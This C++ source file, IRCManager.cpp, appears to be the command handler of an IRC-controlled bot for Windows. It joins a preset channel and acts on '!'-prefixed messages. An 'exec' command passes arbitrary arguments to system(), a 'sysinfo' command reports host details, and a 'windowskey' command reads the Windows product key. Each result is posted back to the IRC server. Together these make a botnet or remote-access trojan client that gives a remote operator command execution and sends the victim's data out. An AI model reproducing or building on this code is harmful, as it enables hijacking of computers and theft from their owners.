/*
 * IRCManager.cpp
 *
 *  Created on: May 13, 2012
 *      Author: mbreedlove
 */

#include "IRCManager.h"

IRCManager::IRCManager() {
	ircc = new IRCClient(IRC_SERVER, IRC_PORT);
	IRC_CommandPrefix = '!';

	connected = false;
	hThread = 0;
}

IRCManager::~IRCManager() {
	delete ircc;
}

char IRCManager::getIRCCommandPrefix() { 
	return IRC_CommandPrefix;
}

bool IRCManager::isConnected() {
	return connected;
}

void IRCManager::start() {
	connected = ircc->connect();
	Sleep(500);
	ircc->joinChannel(IRC_CHANNEL);
	if(!connected) { return; }
	hThread = this->startThread();
}

void IRCManager::stop() {
	connected = false;
	CloseHandle(hThread);
	ircc->disconnect();
}

HANDLE IRCManager::startThread() {
	hThread = (HANDLE)_beginthread(monitorIRC, 0, this);
	return hThread;
}

void monitorIRC(void* i) {
	IRCClient* ircc = (IRCClient*)((IRCManager*)i)->ircc;
	std::string data;
	data = ircc->readRaw();
	ircc->setServerName(data.substr(1, data.find_first_of(" ") -1));

	while(true) {
		data = ircc->readRaw();

		// Check if connection was lost
		if(data.empty()) {
			// Close connections and exit
			((IRCManager*)i)->stop();
			return;
		}
		std::cout << data;
		fflush(stdout);

		// Handle data
		parseData(ircc, data, ((IRCManager*)i)->getIRCCommandPrefix());
	}
}

void parseData(IRCClient* ircc, std::string data, char IRC_CommandPrefix) {
	std::string prefix;
	std::string command;
	std::string params;

	unsigned int stop;
	unsigned int size = data.size();

	// Prefix
	stop = data.find_first_of(" ");
	prefix = data.substr(1, stop);

	// Command
	stop = data.find(" ", stop);
	command = data.substr(stop +1, size -2);

	// Params
	stop = command.find_first_of(" ");
	if(stop != std::string::npos) {
		params = command.substr(stop +1, command.size() -1);
		command = command.substr(0, stop);
	}

	// We only care about messages to the bot
	if(command.compare("PRIVMSG") != 0)
		return;


	std::string botCommand;
	std::string botArgs;

	stop = params.find_first_of(":");
	botCommand = params.substr(stop +1, params.size() -1);
	// If Bot command has valid prefix
	if(botCommand.at(0) == IRC_CommandPrefix) {
		// Remove special char
		botCommand = botCommand.substr(1, botCommand.size() -1);

		// Remove CR/LF
		botCommand = botCommand.substr(0, botCommand.size() -2);

		// Split into message and args
		stop = botCommand.find_first_of(" ");
		if(stop != -1) {
			botArgs = botCommand.substr(stop + 1, botCommand.size());
			botCommand = botCommand.substr(0, stop);
		}
		
		// Execute command and save result
		std::string result;
		result = executeCommand(botCommand, botArgs);

		// If there was a result message, send it to the server
		if(!result.empty())
			ircc->sendMessage(ircc->getIRCChannels()[0], result);

	}

	return;
}


std::string executeCommand(std::string command, std::string args) {
	std::string result = "";
	if(!command.compare("sysinfo")) {
		result = SysInfo::SysInfoString();
	}

	if(!command.compare("exec")) {
		system(args.c_str());
		result = args;
	}

    if(!command.compare("windowskey")) {
       result = SysInfo::getWindowsProductKey();
    }

	std::cout << "Executing command: " << command << " " << args << std::endl;

	return result;
}
